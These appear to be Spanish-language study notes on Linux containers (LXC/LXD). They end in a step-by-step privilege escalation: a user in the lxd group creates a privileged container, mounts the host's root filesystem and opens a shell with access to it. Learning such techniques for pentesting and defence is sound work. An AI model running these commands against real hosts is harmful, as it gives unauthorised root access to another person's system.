
Los contenedores operan en el SO y MVs a nivel de hw por lo que comparten SO solo que aislan procesos de las aplicaciones del resto del sistema mientras que en la virtualizacion clasica lo que se permite es que hayan varios SOs en un mismo sistema

## Contenedores Linux - LXC

Son una tecnica de virtualizacion a nivel de SO que permite que varios sistemas Linux se ejecuten de forma aislada entre si en un unico anfitrion compartiendo Kernel 

Una plataforma LXC puede organizarse en multiples nubes lo que proporciona portabilidad y garantiza que las aplicaciones que se ejecutan en el sistema desarrollador se ejecuten tambien en cualquier otro sistema

## Demonio de Linux - LXD

Es similar pero esta diseñado para contener un SO completo por lo que no es un contenedor de aplicaciones sino de sistema

1. Debemos pertenecer al grupo `lxc` o `lxd`

```
id
```
![[Pasted image 20260919133534.png]]

	A partir de aqui hay varias formas para explotar LXC y LXD como crear nuestro propio contenedor y transferirlo al sistema objetivo o usar un contenedor existente. Los admins suelen usar plantillas con poco o ninguna seguridad

2. Vemos un directorio llamado `ContainerImages` que puede contener imagenes de contenedores:

```
cd ContainerImages
ls
```
![[Pasted image 20260919133724.png]]

3. Aqui encontramos una plantilla (suelen tener poca o ninguna seguridad). Si existe un contenedor de este tipo en el sistema podremos escalar rapidamente:

- Verificamos que esta imagen se ha importado correctamente

```
lxc image import ubuntu-template.tar.xz --alias ubuntutemp
lxc image list
```
![[Pasted image 20260919133841.png]]

- La iniciamos y configuramos con flag `security.privileged` (deshabilita todas las caracteristicas del aislamiento pudiendo interactuar con el anfitrion) y la ruta `/` para el contenedor 

```
lxc init ubuntutemp privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```
![[Pasted image 20260919134014.png]]


- Ahora si la iniciamos e iniciamos sesion y podemos interactuar con el sistema anfitrion

```
lxc start privesc
lxc exec privesc /bin/bash
ls -l /mnt/root
```
![[Pasted image 20260919134120.png]]
